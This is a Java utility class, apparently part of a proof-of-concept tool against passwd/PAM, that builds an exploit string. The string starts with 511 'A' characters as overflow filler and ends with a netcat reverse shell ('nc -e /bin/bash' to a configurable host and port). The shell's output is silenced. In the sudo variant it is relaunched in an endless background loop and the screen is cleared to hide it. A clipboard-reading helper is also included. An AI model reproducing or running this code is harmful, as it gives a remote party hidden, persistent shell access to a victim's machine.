package com.github.rumoel.utils;

import java.awt.Toolkit;
import java.awt.datatransfer.Clipboard;
import java.awt.datatransfer.DataFlavor;
import java.awt.datatransfer.UnsupportedFlavorException;
import java.io.IOException;

import com.github.rumoel.header.HeaderPasswdPam;

public class PasswdPamUtils {
	public static void createPoc() {
		// clear
		HeaderPasswdPam.poc.setLength(0);

		HeaderPasswdPam.poc.append("A".repeat(511));
		HeaderPasswdPam.poc.append('\n');

		// cmd

		// REVERSE_SHELL
		String rs = "nc -e /bin/bash " + HeaderPasswdPam.host + " " + HeaderPasswdPam.port;
		String noo = " 1>/dev/null 2>/dev/null";// no output
		rs = rs + noo;

		if (HeaderPasswdPam.useSudo) {
			String cmd = "sudo bash -c 'while true;do " + rs + ";done & clear'";
			HeaderPasswdPam.poc.append(cmd);
		} else {
			HeaderPasswdPam.poc.append(rs).append(noo);
		}
		HeaderPasswdPam.poc.append('\n');// execute (ENTER)
	}

	public static String getClip() throws UnsupportedFlavorException, IOException {
		Clipboard c = Toolkit.getDefaultToolkit().getSystemClipboard();
		return (String) c.getData(DataFlavor.stringFlavor);
	}
}
